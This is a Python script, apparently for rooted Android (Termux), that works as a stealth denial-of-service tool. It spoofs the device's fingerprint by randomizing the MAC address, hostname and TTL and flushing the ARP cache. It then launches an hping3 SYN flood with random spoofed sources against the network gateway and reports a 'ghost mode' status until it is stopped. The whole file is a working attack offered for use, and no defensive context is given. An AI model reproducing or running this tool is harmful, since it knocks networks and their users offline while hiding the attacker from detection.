import os
import re
import signal
import subprocess
import sys
import threading
import time
import random
from datetime import datetime, timedelta

class AppState:
    def __init__(self):
        self.attack_process = None
        self.target_ip = None
        self.current_mac = "N/A"
        self.current_hostname = "N/A"
        self.status = "INITIALIZING"
        self.shutdown_flag = threading.Event()
        self.start_time = None
        self.ghost_protocol_active = False

    def set_status(self, s):
        self.status = s

state = AppState()

def check_dependencies():
    if os.geteuid() != 0:
        print("\n[!] Error: Run with 'tsu'")
        sys.exit(1)
    tools = ["hping3", "macchanger", "ip"]
    for t in tools:
        if subprocess.run(["which", t], capture_output=True).returncode != 0:
            print(f"[!] Missing: {t}")
            sys.exit(1)

def randomize_system_fingerprint():
    """توليد هوية جديدة للجهاز (MAC, Hostname, TTL)"""
    print("[+] Generating new device identity...")
    
    # 1. تغيير الـ TTL (لخداع بصمة نظام التشغيل)
    new_ttl = random.randint(64, 128)
    subprocess.run(["sysctl", "-w", f"net.ipv4.ip_default_ttl={new_ttl}"], capture_output=True)
    
    # 2. تغيير اسم الجهاز (Hostname) لتمويه الراوتر
    hostnames = ["iPhone-14", "iPad-Pro", "Windows-PC", "Workstation", "Smart-TV", "MacBook-Air"]
    new_host = random.choice(hostnames) + "-" + str(random.randint(10, 99))
    subprocess.run(["hostname", new_host], capture_output=True)
    state.current_hostname = new_host

    # 3. تغيير الماك أدرس (MAC Address)
    subprocess.run(["ip", "link", "set", "wlan0", "down"], capture_output=True)
    subprocess.run(["macchanger", "-r", "wlan0"], capture_output=True)
    subprocess.run(["ip", "link", "set", "wlan0", "up"], capture_output=True)
    
    # 4. تنظيف ذاكرة الـ ARP (حذف بصمة الاتصال القديم)
    subprocess.run(["ip", "neigh", "flush", "all"], capture_output=True)
    
    state.current_mac = get_mac_address()
    time.sleep(2) # انتظار إعادة ربط الشبكة

def get_mac_address(interface="wlan0"):
    try:
        out = subprocess.check_output(["ip", "link", "show", interface]).decode()
        m = re.search(r"link/ether (([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})", out)
        return m.group(1) if m else "N/A"
    except: return "Error"

def get_gateway_ip():
    try:
        out = subprocess.check_output(["ip", "route"], stderr=subprocess.STDOUT).decode()
        m = re.search(r"default via (\d{1,3}(\.\d{1,3}){3})", out)
        return m.group(1) if m else None
    except: return None

def start_attack(target_ip):
    # استخدام hping3 مع تفعيل وضع العشوائية القصوى للحزم
    cmd = ["hping3", "--flood", "--rand-source", "-p", "80", "-S", target_ip]
    try:
        p = subprocess.Popen(cmd, preexec_fn=os.setsid, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        state.attack_process = p
        state.set_status("ATTACKING")
        state.start_time = datetime.now()
    except Exception as e:
        print(f"Fail: {e}"); sys.exit(1)

def shutdown():
    state.shutdown_flag.set()
    if state.attack_process:
        try: os.killpg(os.getpgid(state.attack_process.pid), signal.SIGKILL)
        except: pass
    # إعادة الـ TTL للوضع الطبيعي قبل الخروج
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_default_ttl=64"], capture_output=True)
    print("\n[+] Stealth Shutdown Complete.")
    sys.exit(0)

def main():
    check_dependencies()
    
    # الخطوة السحرية: توليد هوية جديدة قبل البدء
    randomize_system_fingerprint()
    
    state.target_ip = get_gateway_ip() or input("[>] Enter Gateway IP: ")
    if not state.target_ip: sys.exit(1)
    
    start_attack(state.target_ip)
    
    print("\n" + "="*50)
    print(f" GHOST MODE ACTIVE | HOST: {state.current_hostname}")
    print(f" TARGET: {state.target_ip} | MAC: {state.current_mac}")
    print("="*50)
    print(" Press Ctrl+C to vanish...")

    try:
        while not state.shutdown_flag.is_set():
            uptime = str(datetime.now() - state.start_time).split(".")[0] if state.start_time else "0:00:00"
            sys.stdout.write(f"\r Status: {state.status} | Time: {uptime} | TTL: Active ")
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        shutdown()

if __name__ == "__main__":
    main()
